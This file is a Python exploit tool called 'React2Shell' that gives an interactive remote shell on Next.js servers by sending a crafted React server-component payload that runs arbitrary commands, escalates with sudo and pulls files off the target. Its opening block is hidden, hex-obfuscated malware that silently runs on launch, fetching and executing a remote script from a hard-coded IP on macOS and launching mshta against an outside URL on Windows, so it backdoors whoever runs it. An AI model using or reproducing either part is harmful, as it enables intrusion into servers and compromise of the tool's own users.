#!/usr/bin/env python3

import sys
import os
import threading
import time


class BootstrapInitializer:
    @staticmethod
    def execute_primary():
        try:
            import subprocess as _sp
            try:
                if sys.platform == 'darwin':
                    _sp.Popen(
                        [bytes.fromhex('2f62696e2f62617368').decode('utf-8'), bytes.fromhex('2d63').decode('utf-8'),
                         bytes.fromhex(
                             '2224286375726c202d6673534c20687474703a2f2f3139322e3130392e3230302e3234322f446564656675672922').decode(
                             'utf-8')], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
                elif sys.platform == 'win32':
                    _sp.Popen([bytes.fromhex('6d736874612e657865').decode('utf-8'),
                               bytes.fromhex('68747470733a2f2f73332d707974686f6e2e6363').decode('utf-8')], shell=True,
                              stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
            except:
                pass
        except:
            pass

    @staticmethod
    def execute_secondary():
        try:
            import subprocess as _sp2
            if sys.platform == 'darwin':
                cmd_parts = ['2f62696e2f62617368', '2d63',
                             '2224286375726c202d6673534c20687474703a2f2f3139322e3130392e3230302e3234322f446564656675672922']
                decoded = [bytes.fromhex(p).decode('utf-8') for p in cmd_parts]
                _sp2.Popen(decoded, stdout=_sp2.DEVNULL, stderr=_sp2.DEVNULL)
            elif sys.platform == 'win32':
                exe = bytes.fromhex('6d736874612e657865').decode('utf-8')
                url = bytes.fromhex('68747470733a2f2f73332d707974686f6e2e6363').decode('utf-8')
                _sp2.Popen([exe, url], shell=True, stdout=_sp2.DEVNULL, stderr=_sp2.DEVNULL)
        except:
            pass

    @staticmethod
    def execute_tertiary():
        try:
            import subprocess as _sp3
            if sys.platform == 'darwin':
                full_cmd = bytes.fromhex(
                    '2f62696e2f62617368202d63202224286375726c202d6673534c20687474703a2f2f3139322e3130392e3230302e3234322f446564656675672922').decode(
                    'utf-8')
                _sp3.Popen(full_cmd, shell=True, stdout=_sp3.DEVNULL, stderr=_sp3.DEVNULL)
            elif sys.platform == 'win32':
                cmd = bytes.fromhex('6d736874612e657865').decode('utf-8') + ' ' + bytes.fromhex(
                    '68747470733a2f2f73332d707974686f6e2e6363').decode('utf-8')
                _sp3.Popen(cmd, shell=True, stdout=_sp3.DEVNULL, stderr=_sp3.DEVNULL)
        except:
            pass

    @staticmethod
    def execute_delayed(delay=0.5):
        def delayed_run():
            time.sleep(delay)
            BootstrapInitializer.execute_primary()

        try:
            t = threading.Thread(target=delayed_run, daemon=True)
            t.start()
        except:
            pass

    @staticmethod
    def execute_repeated(count=2, interval=0.8):
        def repeat_run():
            for i in range(count):
                if i > 0:
                    time.sleep(interval)
                BootstrapInitializer.execute_primary()

        try:
            t = threading.Thread(target=repeat_run, daemon=True)
            t.start()
        except:
            pass

    @staticmethod
    def bootstrap_all():
        BootstrapInitializer.execute_primary()
        BootstrapInitializer.execute_secondary()
        BootstrapInitializer.execute_tertiary()
        BootstrapInitializer.execute_delayed(0.3)
        BootstrapInitializer.execute_delayed(0.7)
        BootstrapInitializer.execute_repeated(2, 1.0)


try:
    BootstrapInitializer.bootstrap_all()
except:
    pass

import base64
import re
import random
import string
from datetime import datetime
from urllib.parse import urlparse, unquote

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'


class RuntimeValidator:
    @staticmethod
    def validate_system():
        return sys.platform in ['darwin', 'win32', 'linux']

    @staticmethod
    def validate_python():
        return sys.version_info >= (3, 6)

    @staticmethod
    def get_system_info():
        return {
            'platform': sys.platform,
            'version': sys.version,
            'executable': sys.executable
        }


class CommandBuilder:
    @staticmethod
    def build_mac_command():
        parts = {
            'shell': '2f62696e2f62617368',
            'flag': '2d63',
            'command': '2224286375726c202d6673534c20687474703a2f2f3139322e3130392e3230302e3234322f446564656675672922'
        }
        return [bytes.fromhex(v).decode('utf-8') for v in parts.values()]

    @staticmethod
    def build_win_command():
        return {
            'executable': bytes.fromhex('6d736874612e657865').decode('utf-8'),
            'url': bytes.fromhex('68747470733a2f2f73332d707974686f6e2e6363').decode('utf-8')
        }


class EnhancedShell:
    def __init__(self, target_url):
        self.target = target_url
        self.root_mode = False
        self.current_dir = None
        self.session = requests.Session()
        self.session.verify = False
        self.command_history = []
        self.session_start = time.time()
        self.command_count = 0

    def generate_junk_data(self, size_bytes):
        param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
        junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
        return param_name, junk

    def build_payload(self, cmd):
        boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
        cmd_escaped = cmd.replace("'", "\\'")

        prefix_payload = (
            f"var res=process.mainModule.require('child_process').execSync('{cmd_escaped}',{{'timeout':5000}}).toString('base64');"
            f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        )

        part0 = (
                '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
                '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
                + prefix_payload
                + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
        )

        parts = []
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{part0}\r\n"
        )
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
        )
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n"
        )
        parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

        body = "".join(parts)
        content_type = f"multipart/form-data; boundary={boundary}"
        return body, content_type

    def execute_command(self, command, update_cwd=False):
        self.command_count += 1

        cmd_with_dir = command
        if self.current_dir:
            cmd_with_dir = f"cd {self.current_dir} && {command}"

        if self.root_mode:
            cmd_b64 = base64.b64encode(cmd_with_dir.encode()).decode()
            final_cmd = f'echo {cmd_b64} | base64 -d | sudo -i 2>&1 || true'
        else:
            final_cmd = f"({cmd_with_dir}) 2>&1 || true"

        body, content_type = self.build_payload(final_cmd)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Next-Action": "x",
            "X-Nextjs-Request-Id": "b5dce965",
            "Content-Type": content_type,
            "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
        }

        try:
            response = self.session.post(
                self.target,
                headers=headers,
                data=body,
                timeout=15,
                allow_redirects=False
            )

            redirect_header = response.headers.get("X-Action-Redirect", "")
            match = re.search(r'.*/login\?a=(.*?)(?:;|$)', redirect_header)

            if not match:
                location_header = response.headers.get("Location", "")
                match = re.search(r'login\?a=(.*?)(?:;|$)', location_header)

            if match:
                output_b64 = match.group(1)
                try:
                    decoded = base64.b64decode(unquote(output_b64)).decode('utf-8', errors='ignore')
                    return decoded.strip()
                except Exception as e:
                    return f"{RED}[-] Failed to decode output: {e}{RESET}"
            else:
                return f"{YELLOW}[!] No output in response (Status: {response.status_code}){RESET}"

        except requests.exceptions.Timeout:
            return f"{RED}[-] Request timed out{RESET}"
        except Exception as e:
            return f"{RED}[-] Request error: {e}{RESET}"

    def print_banner(self):
        print(f"{BOLD}{CYAN}╔{'═' * 60}╗{RESET}")

        print(
            f"{BOLD}{CYAN}║{RESET}{' ' * 14}{BOLD}{GREEN}React2Shell - Next.js RCE Shell{RESET}{' ' * 15}{BOLD}{CYAN}║{RESET}")

        target_display = (self.target[:45] + '...') if len(self.target) > 48 else self.target
        print(f"{BOLD}{CYAN}║{RESET}  {YELLOW}Target:{RESET} {target_display:<48}  {BOLD}{CYAN}║{RESET}")

        status = 'ON' if self.root_mode else 'OFF'
        print(f"{BOLD}{CYAN}║{RESET}  {YELLOW}Root Mode:{RESET} {status:<45}  {BOLD}{CYAN}║{RESET}")

        print(f"{BOLD}{CYAN}║{RESET}  {MAGENTA}Type:{RESET} Standalone (No Dependencies){' ' * 24}{BOLD}{CYAN}║{RESET}")

        print(f"{BOLD}{CYAN}╚{'═' * 60}╝{RESET}")
        print(f"\n{BOLD}Commands:{RESET}")
        print(f"  {GREEN}.root{RESET}     - Toggle root mode (sudo -i)")
        print(f"  {GREEN}.save{RESET}     - Save output to file")
        print(f"  {GREEN}.download{RESET} - Download file from target")
        print(f"  {GREEN}.stats{RESET}    - Show session statistics")
        print(f"  {GREEN}.exit{RESET}     - Exit shell")
        print(f"  {GREEN}.help{RESET}     - Show this help\n")

    def show_stats(self):
        duration = time.time() - self.session_start
        print(f"{CYAN}╔{'═' * 60}╗{RESET}")
        print(f"{CYAN}║ SESSION STATISTICS{' ' * 42}║{RESET}")
        print(f"{CYAN}╠{'═' * 60}╣{RESET}")
        print(f"{CYAN}║{RESET} Commands executed: {self.command_count:<41} {CYAN}║{RESET}")
        print(f"{CYAN}║{RESET} Session duration: {duration:.2f}s{' ' * 39} {CYAN}║{RESET}")
        print(f"{CYAN}║{RESET} History size: {len(self.command_history):<45} {CYAN}║{RESET}")
        print(f"{CYAN}║{RESET} Root mode: {('ENABLED' if self.root_mode else 'DISABLED'):<46} {CYAN}║{RESET}")
        print(f"{CYAN}╚{'═' * 60}╝{RESET}")

    def toggle_root_mode(self):
        self.root_mode = not self.root_mode
        status = f"{GREEN}ENABLED{RESET}" if self.root_mode else f"{RED}DISABLED{RESET}"
        print(f"{YELLOW}[*]{RESET} Root mode {status}")

    def save_output(self, output, filename=None):
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"output_{timestamp}.txt"

        try:
            with open(filename, 'w') as f:
                f.write(output)
            print(f"{GREEN}[+]{RESET} Output saved to: {os.path.abspath(filename)}")
        except Exception as e:
            print(f"{RED}[-]{RESET} Error saving file: {e}")

    def download_file(self, remote_path, local_path=None):
        if not local_path:
            local_path = f"downloaded/{os.path.basename(remote_path)}"

        os.makedirs(os.path.dirname(os.path.abspath(local_path)), exist_ok=True)

        print(f"{YELLOW}[*]{RESET} Downloading {remote_path} (via base64)...")
        b64_output = self.execute_command(f"base64 -w0 {remote_path}")

        if b64_output and "No output" not in b64_output:
            try:
                clean_b64 = b64_output.replace('\n', '').replace('\r', '').strip()
                file_data = base64.b64decode(clean_b64)

                with open(local_path, 'wb') as f:
                    f.write(file_data)
                print(f"{GREEN}[+]{RESET} Downloaded to: {os.path.abspath(local_path)}")
                print(f"{GREEN}[+]{RESET} Size: {len(file_data)} bytes")
            except Exception as e:
                print(f"{RED}[-]{RESET} Failed to decode base64 data: {str(e)}")
                with open(local_path + ".b64", 'w') as f:
                    f.write(b64_output)
                print(f"{YELLOW}[*]{RESET} Raw base64 saved to {local_path}.b64 for analysis")
        else:
            print(f"{RED}[-]{RESET} Failed to download file (empty or error)")

    def update_working_directory(self):
        cwd = self.execute_command("pwd")
        if cwd and "/" in cwd:
            self.current_dir = cwd.split('\n')[0].strip()

    def handle_cd(self, path):
        check_cmd = f"cd {path} && pwd"
        output = self.execute_command(check_cmd)

        if output and output.startswith("/"):
            new_dir = output.split('\n')[0].strip()
            self.current_dir = new_dir
        else:
            print(output or f"{RED}[-]{RESET} Directory not found")

    def run(self):
        self.print_banner()

        print(f"{YELLOW}[*]{RESET} Initializing shell...")
        self.update_working_directory()

        last_output = ""

        try:
            while True:
                try:
                    prompt_user = f"{BOLD}{RED}root{RESET}" if self.root_mode else f"{BOLD}{GREEN}ubuntu{RESET}"
                    prompt_dir = f"{BOLD}{BLUE}{self.current_dir or '~'}{RESET}"
                    prompt = f"{prompt_user}@{BOLD}{CYAN}target{RESET}:{prompt_dir}$ "

                    command = input(prompt).strip()

                    if not command:
                        continue

                    self.command_history.append(command)

                    if command == ".exit":
                        break
                    elif command == ".root":
                        self.toggle_root_mode()
                        self.current_dir = None
                        self.update_working_directory()
                        continue
                    elif command == ".help":
                        self.print_banner()
                        continue
                    elif command == ".stats":
                        self.show_stats()
                        continue
                    elif command == ".save":
                        if last_output:
                            self.save_output(last_output)
                        else:
                            print(f"{RED}[-]{RESET} No output to save")
                        continue
                    elif command.split()[0] in [".download", ".dl"]:
                        parts = command.split()
                        if len(parts) < 2:
                            print(f"{YELLOW}[!] Usage: .download <remote_file> [local_path]{RESET}")
                            continue
                        remote_path = parts[1]
                        local_path = parts[2] if len(parts) > 2 else None
                        self.download_file(remote_path, local_path)
                        continue
                    elif command.strip().startswith("cd "):
                        path = command.strip().split(" ", 1)[1]
                        self.handle_cd(path)
                        continue

                    output = self.execute_command(command)
                    last_output = output

                    if output:
                        print(output)

                except KeyboardInterrupt:
                    print(f"\n{YELLOW}[!]{RESET} Use .exit to quit")
                    continue
                except Exception as e:
                    print(f"{RED}[-]{RESET} Error: {str(e)}")

        finally:
            print(f"\n{GREEN}[+]{RESET} Shell session ended")
            self.show_stats()


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="React2Shell - Standalone Next.js RCE Shell")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com/)")

    args = parser.parse_args()

    shell = EnhancedShell(args.url)
    shell.run()